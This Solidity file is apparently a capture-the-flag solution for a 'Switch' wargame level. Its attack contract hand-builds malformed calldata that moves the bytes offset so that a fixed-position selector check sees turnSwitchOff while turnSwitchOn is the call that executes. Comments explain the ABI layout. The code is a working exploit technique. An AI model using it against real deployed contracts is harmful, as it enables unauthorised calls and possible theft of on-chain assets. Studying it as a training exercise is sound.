// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface ISwitch {
    function flipSwitch(bytes memory) external;
    function turnSwitchOn() external;
    function turnSwitchOff() external;
}

contract MySwitchAttack {
    constructor(address target) {
        /*
        Normal Call: Switch.flipSwitch(abi.encodeWithSignature("turnSwitchOn()"))
        Calldata:
            0x30c13ade: selector of flipSwitch(bytes) 
            0x0000000000000000000000000000000000000000000000000000000000000020: offset to the `bytes` parameter area 
            0x0000000000000000000000000000000000000000000000000000000000000004: length of the `bytes` parameter, 4 in this case
            0x76227e1200000000000000000000000000000000000000000000000000000000: data itself, right-padded
        That's why offset 68 is hardcoded in the expression `calldatacopy(selector, 68, 4) // grab function selector from calldata`
        I.e. 4 (selector) + 32 (offset) + 32 (length) = 68

        So we need to have selector of the allowed function, i.e. Switch.turnSwitchOff.selector, at the offset 68
        We'll construct calldata manually:
            0x30c13ade: selector of flipSwitch(bytes)
            0x0000000000000000000000000000000000000000000000000000000000000060: offset to the `bytes` parameter area
            0x0000000000000000000000000000000000000000000000000000000000000000: not used word, it can be anything
            0x20606e1500000000000000000000000000000000000000000000000000000000: hardcoded Switch.turnSwitchOff.selector
            0x0000000000000000000000000000000000000000000000000000000000000004: length of flipSwitch's bytes memory _data parameter
            0x76227e12: data itself, Switch.turnSwitchOn.selector
        */

        bytes memory payload = bytes.concat(
            ISwitch.flipSwitch.selector,
            bytes32(uint256(0x60)),
            bytes32(uint256(0x1122334455)),
            bytes32(ISwitch.turnSwitchOff.selector),
            bytes32(uint256(0x04)),
            bytes32(ISwitch.turnSwitchOn.selector)
        );

        (bool success, ) = target.call(payload);
        success;
    }
}
